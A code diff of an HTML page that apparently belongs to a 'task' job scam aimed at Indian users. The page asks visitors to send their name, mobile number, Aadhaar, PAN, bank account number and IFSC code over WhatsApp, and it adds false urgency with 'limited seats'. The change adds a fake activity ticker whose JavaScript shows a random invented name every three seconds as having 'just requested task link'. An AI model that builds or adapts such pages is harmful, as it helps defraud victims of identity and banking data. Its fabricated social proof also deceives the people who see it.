@@ -34,6 +34,30 @@
         SEND YOUR NAME,MOBILE NUMBER, AADHAR NUMBER, PAN NUMBER, ACCOUNT NUMBER, 
         IFSC ON WHATSAPP AFTER PROCESS, I WILL GUIDE YOU !!LIMITED SEAT AVAILABLE!!
     </div>
+<!-- Ticker Box (Isse copy karke Question section ke upar paste karein) -->
+<div class="ticker-box" style="background: #f8fafc; border: 1px solid #e2e8f0; padding: 12px; border-radius: 12px; margin-bottom: 20px; font-size: 13px; font-weight: 600; color: #475569; display: flex; align-items: center; justify-content: center; gap: 8px;">
+    <span>🔄</span>
+    <span id="ticker-text">User <span style="color: #0369a1;">Arjun R.</span> just requested task link</span>
+    <span style="color: #16a34a; background: #dcfce7; padding: 2px 6px; border-radius: 4px; font-size: 11px;">Active</span>
+</div>
+
+<!-- JavaScript (Isse apni file ke niche script tag mein add karein) -->
+<script>
+    const names = [
+        "Arjun R.", "Karthik S.", "Priya V.", "Suresh M.", "Anjali K.", 
+        "Vijay B.", "Lakshmi P.", "Ravi T.", "Deepa N.", "Mahesh D.", 
+        "Sanjay G.", "Divya L.", "Rajesh H.", "Kavitha R.", "Sunil K.", 
+        "Meena S.", "Vikram T.", "Shanthi M.", "Babu P.", "Vidya V.",
+        "Ashok R.", "Gayathri S.", "Prabhu K.", "Sindhu N.", "Manoj B.",
+        "Anitha G.", "Ganesh D.", "Swetha L.", "Senthil R.", "Ramya P."
+    ];
+    const ticker = document.getElementById("ticker-text");
+    setInterval(() => {
+        const randomName = names[Math.floor(Math.random() * names.length)];
+        ticker.innerHTML = `User <span style="color: #0369a1;">${randomName}</span> just requested task link`;
+    }, 3000);
+</script>
+    
 
     <div class="radio-group">
         DO YOU HAVE PAN CARD?<br>
